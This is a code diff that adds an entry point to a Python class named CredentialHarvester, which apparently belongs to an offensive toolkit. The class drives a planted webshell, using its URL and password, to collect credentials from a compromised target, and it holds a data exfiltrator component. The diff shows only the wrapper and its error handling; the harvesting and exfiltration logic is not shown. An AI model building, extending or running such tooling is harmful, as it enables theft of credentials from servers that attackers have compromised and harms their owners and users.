@@ -19,6 +19,46 @@ class CredentialHarvester:
         self.webshell = webshell_manager
         self.exfiltrator = data_exfiltrator
     
+    async def run(self, target: Dict) -> Dict:
+        """
+        Main entry point for credential harvesting
+        
+        Args:
+            target: Dict containing:
+                - shell_url: Webshell URL
+                - shell_password: Webshell password
+                - target_url: Target URL (optional)
+        
+        Returns:
+            Dict with harvesting results
+        """
+        shell_url = target.get('shell_url')
+        shell_password = target.get('shell_password')
+        
+        if not shell_url or not shell_password:
+            return {
+                'success': False,
+                'error': 'Missing shell_url or shell_password',
+                'credentials': {}
+            }
+        
+        try:
+            credentials = await self.harvest_all(shell_url, shell_password)
+            
+            return {
+                'success': True,
+                'credentials': credentials,
+                'total_harvested': credentials.get('total', 0)
+            }
+        
+        except Exception as e:
+            log.error(f"[CredHarvest] Error: {e}")
+            return {
+                'success': False,
+                'error': str(e),
+                'credentials': {}
+            }
+    
     async def harvest_all(self, shell_url: str, shell_password: str) -> Dict:
         """
         Harvest all credentials from target
